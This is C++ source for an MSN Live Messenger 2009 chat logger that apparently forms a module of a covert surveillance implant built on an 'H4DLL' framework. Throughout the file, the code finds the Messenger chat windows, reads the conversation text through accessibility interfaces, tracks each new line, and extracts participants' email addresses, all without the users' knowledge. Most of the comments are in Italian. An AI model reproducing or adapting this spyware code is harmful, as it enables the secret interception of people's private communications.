/*
* MSN Live Messenger 2009 logger
*
* Coded by: Quequero
* Date: 09/Mar/2009
*
*/

#include <exception>
#include <new>

using namespace std;

#include "QMsnLive2009.h"
#include "../../H4DLL/HM_SafeProcedures.h"
#include "../../H4DLL/common.h"

#define MIN_SEARCH_LENGTH 200

PWCHAR QMsnLive2009::wUserList[] = {
	(PWCHAR)L"IMWindowClass",
	0
};

PWCHAR QMsnLive2009::wChatTree[] = {
	(PWCHAR)L"IMWindowClass",
	(PWCHAR)L"IM Window Class",
	(PWCHAR)L"DirectUIHWND",
	0
};

PWCHAR QMsnLive2009::wMarker[] = {
	(PWCHAR)L" Fine conversazione - Inizio conversazione ",		     // IT
	(PWCHAR)L" End of conversation - Start of conversation ",	     // EN
	(PWCHAR)L" Fin de la conversación - Inicio de la conversación ", // ES
	(PWCHAR)L" Fin de la conversation - Début de la conversation ",  // FR
	0
};

QMsnLive2009::QMsnLive2009(HWND hw) : QMsnLive85(hw)
{
	hwChat = ole.GetHandleFromClass(wChatTree);
	hwUserList = ole.GetHandleFromClass(wUserList);
}

QMsnLive2009::~QMsnLive2009()
{

}

BOOL QMsnLive2009::GrabHistory()
{
	LONG uCount, i = 0;
	BSTR bChat;
	PWCHAR wHistory, wLine = NULL;

	if(!FNC(IsWindow)(ole.GetHandle()))
		return FALSE;

	if(hwChat == NULL)
		return FALSE;

	ole.SetHandle(hwChat);

	if(ole.SetInterface() == FALSE){
		ole.Clean();
		return FALSE;
	}

	uCount = ole.GetDispatchTypeCount(ROLE_SYSTEM_TEXT);

	if(ole.SetDispatchInterfaceFromType(ROLE_SYSTEM_TEXT, 0) == FALSE) {
		ole.Clean();
		return FALSE;
	}

	// Se e' il primo grab di questo oggetto, prendi solo l'ultima
	// riga, in questo modo skippiamo tutta la history precedente.
	if(bFirstGrab){
		if(ole.GetValueFromContainer(&bChat, CHILDID_SELF) == FALSE || bChat == NULL){
			properties.SetUpdated(FALSE);
			ole.Clean();
			return FALSE;
		}

		// In una chat vuota cmq c'e' un "a capo" inserito di default
		// dal programma
		if(wcslen(bChat) == 1){
			SAFE_SYSFREESTR(bChat);
			ole.Clean();
			return TRUE;
		}

		// Cerca il terminatore, se non c'e' stiamo leggendo la history
		i = 0;

		while(wMarker[i]){
			wLine = wcsstr(bChat, wMarker[i]);

			if(wLine)
				break;

			i++;
		}

		// Se c'e' il terminatore, leggiamo la riga
		if(wLine){
			/*if(wcsstr(wLine + wcslen(wMarker[i]), wMarker[i])){
				wLine = wcsstr(wLine + wcslen(wMarker[i]), wMarker[i]);
			}*/

			uCount = wLine - bChat;
			wLine = new(std::nothrow) WCHAR[uCount + 1];

			if(wLine == NULL){
				SAFE_SYSFREESTR(bChat);
				ole.Clean();
				return FALSE;
			}

			ZeroMemory(wLine, (uCount + 1) * sizeof(WCHAR));
			CopyMemory(wLine, bChat, uCount * sizeof(WCHAR));

			properties.ClearHistory();
			properties.SetHistory(wLine);
			properties.ConvertNewLine();
			properties.SetUpdated(TRUE);

			delete[] wLine;
			wLine = NULL;
		}else{ // Altrimenti catturiamo solo l'ultima riga
			if(properties.SetHistory(bChat)){
				properties.ConvertNewLine();
				properties.CleanHistory();
				properties.SetUpdated(TRUE);
			}
		}

		SAFE_SYSFREESTR(bChat);
		bChat = NULL;
		bFirstGrab = FALSE;
		ole.Clean();
		return TRUE;
	}

	// Se siamo qui, non e' il primo grab
	// Tronca la history se e' gia' stata acquisita
	if(properties.GetAcquiredStatus()){
		properties.TruncateHistory();

		// Acquisiamo il contenuto della finestra
		if(ole.GetValueFromContainer(&bChat, CHILDID_SELF) == FALSE || bChat == NULL){
			ole.Clean();
			return FALSE;
		}

		// Cerca il terminatore, se non c'e' stiamo leggendo la history
		i = 0;

		while(wMarker[i]){
			wLine = wcsstr(bChat, wMarker[i]);

			if(wLine)
				break;

			i++;
		}

		if(wLine){ // C'e' il marcatore
			/*if(wcsstr(wLine + wcslen(wMarker[i]), wMarker[i])){
				wLine = wcsstr(wLine + wcslen(wMarker[i]), wMarker[i]);
			}*/

			uCount = wLine - bChat;
			wLine = new(std::nothrow) WCHAR[uCount + 1];

			if(wLine == NULL){
				SAFE_SYSFREESTR(bChat);
				ole.Clean();
				return FALSE;
			}

			ZeroMemory(wLine, (uCount + 1) * sizeof(WCHAR));
			CopyMemory(wLine, bChat, uCount * sizeof(WCHAR));

			properties.ClearHistory();
			properties.SetHistory(wLine);
			properties.ConvertNewLine();
			properties.SetUpdated(TRUE);

			delete[] wLine;
			wLine = NULL;
			SAFE_SYSFREESTR(bChat);
			bChat = NULL;
		}else{ // Non c'e'
			wLine = new(std::nothrow) WCHAR[wcslen(bChat) + 1];

			if(wLine == NULL){
				SAFE_SYSFREESTR(bChat);
				ole.Clean();
				return FALSE;
			}

			ZeroMemory(wLine, (wcslen(bChat) + 1) * sizeof(WCHAR));
			CopyMemory(wLine, bChat, wcslen(bChat) * sizeof(WCHAR));
			properties.ConvertNewLine(wLine);
			SAFE_SYSFREESTR(bChat);
			bChat = NULL;

			// Cerchiamo dove si trova l'ultima parte acquisita
			wHistory = properties.wcsrstr(wLine, properties.GetHistory());		

			if(wHistory == NULL){
				delete[] wLine;
				wLine = NULL;

				//properties.AppendHistory(wLine);
				properties.SetUpdated(FALSE);
			} else if(wHistory == properties.GetHistory()){
				properties.SetUpdated(FALSE);
			}else{
				uCount = properties.GetHistoryLength();

				if(wcslen(wHistory) == uCount){
					properties.SetUpdated(FALSE);
				}else{
					properties.ClearHistory();
					properties.SetHistory(wHistory + uCount);
					properties.SetUpdated(TRUE);
				}
			}

			if(wLine){
				delete[] wLine;
				wLine = NULL;
			}
		}
	}else{ // Parti dall'ultima riga e confronta
		// Acquisiamo il contenuto della finestra
		if(ole.GetValueFromContainer(&bChat, CHILDID_SELF) == FALSE || bChat == NULL){
			ole.Clean();
			return FALSE;
		}

		// Cerca l'ultima riga della chat che abbiamo nella nostra history
		uCount = properties.GetHistoryLength();
		wHistory = properties.GetHistory();

		if(uCount > MIN_SEARCH_LENGTH)
			wHistory += uCount - MIN_SEARCH_LENGTH;
		
		if(!wcslen(bChat)){
			SAFE_SYSFREESTR(bChat);
			ole.Clean();
			return TRUE;
		}

		wLine = new(std::nothrow) WCHAR[wcslen(bChat) + 1];

		if(wLine == NULL){
			SAFE_SYSFREESTR(bChat);
			ole.Clean();
			return FALSE;
		}

		ZeroMemory(wLine, (wcslen(bChat) + 1) * sizeof(WCHAR));
		CopyMemory(wLine, bChat, wcslen(bChat) * sizeof(WCHAR));
		properties.ConvertNewLine(wLine);

		// Cerchiamo dove si trova l'ultima parte acquisita
		wHistory = wcsstr(wLine, wHistory);	

		if(!wcsncmp(wHistory, properties.GetHistory(), uCount)){
			properties.SetUpdated(FALSE);
		}else{
			properties.AppendHistory(wHistory + uCount);
			properties.SetUpdated(TRUE);
		}

		SAFE_SYSFREESTR(bChat);
		bChat = NULL;

		if(wLine){
			delete[] wLine;
			wLine = NULL;
		}
	}

	if(wLine)
		delete[] wLine;

	ole.Clean();
	return TRUE;
}

BOOL QMsnLive2009::GrabTopic()
{
	// Il topic non c'e' piu' su Live Messenger 2009
	properties.SetId((PWCHAR)L"");
	return TRUE;
}

/**
* Prende l'elenco dei partecipanti e lo mette nelle proprieta'.
*/
BOOL QMsnLive2009::GrabUserList()
{
	UINT uCount, i;
	BOOL bFound = FALSE;
	WCHAR wUsers[512];

	if(!FNC(IsWindow)(ole.GetHandle())){
		properties.SetUsers((PWCHAR)L"");
		return FALSE;
	}

	properties.ClearUsersList();

	ZeroMemory(wUsers, sizeof(wUsers));

	if(HM_SafeGetWindowTextW(hwUserList, wUsers, 512) == 0) {
		properties.SetUsers((PWCHAR)L"");
		return FALSE;
	}

	// Contiamo gli utenti
	PWCHAR pwFirst = wUsers;
	PWCHAR pwLast = wUsers + wcslen(wUsers);
	uCount = 0;

	while(pwFirst = wcschr(pwFirst, '>')) {
		uCount++;
		pwFirst++;

		if(pwFirst >= pwLast)
			break;
	}

	if(uCount == 1) {
		properties.AppendUser(wUsers, FALSE);
		return TRUE;
	}

	pwFirst = wUsers;

	for(i = 0; i < uCount; i++) {
		PWCHAR pwName = NULL;
		// I contatti sono nella forma <user@provider.tld>
		if((pwLast = wcschr(pwFirst, '>')) != NULL) { // C'e' piu' di un utente
			pwName = new(std::nothrow) WCHAR[pwLast - pwFirst + 2];

			if(pwName == NULL) {
				return FALSE;
			}

			UINT uLen = (pwLast - pwFirst + 1) * sizeof(WCHAR);
			ZeroMemory(pwName, uLen + sizeof(WCHAR));
			CopyMemory(pwName, pwFirst, uLen);
						
			if(i < uCount - 1) {
				properties.AppendUser(pwName, TRUE);
				pwFirst = pwLast + 3;
			} else {
				properties.AppendUser(pwName, FALSE);
			}

			delete[] pwName;
		}
	}

	return TRUE;
}

